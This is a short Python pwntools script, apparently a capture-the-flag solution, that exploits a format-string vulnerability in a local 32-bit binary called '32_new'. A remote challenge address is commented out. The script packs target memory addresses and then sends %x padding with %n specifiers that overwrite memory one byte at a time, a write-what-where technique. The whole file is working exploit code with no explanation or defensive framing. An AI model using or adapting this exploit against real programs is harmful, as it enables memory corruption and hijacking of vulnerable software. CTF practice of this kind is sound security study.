#!/usr/bin/python

from pwn import *

#r = remote("163.172.176.29",9035)
r = process("./32_new")
print r.recvuntil("\n")

a = '\x34\xa0\x04\x08\x35\xa0\x04\x08\x36\xa0\x04\x08\x37\xa0\x04\x08\x38\xa0\x04\x08\x39\xa0\x04\x08\x30\xa0\x04\x08\x30\xa0\x04\x08\x30\xa0\x04\x08\x3d\xa0\x04\x08'
a = '\x34\xa0\x04\x08\x35\xa0\x04\x08\x36\xa0\x04\x08\x37\xa0\x04\x08\x34\xa0\x04\x08\x34\xa0\x04\x08\x30\xa0\x04\x08\x30\xa0\x04\x08\x30\xa0\x04\x08\x3d\xa0\x04\x08'

print len(a)

payload = ""
payload += a
payload += "%157x%10$n" # \x0b
payload += "%124x%11$n" # \x87
payload += "%125x%12$n" # \x04
payload += "%260x%13$n" # \x08
r.sendline(payload)
print r.readall()

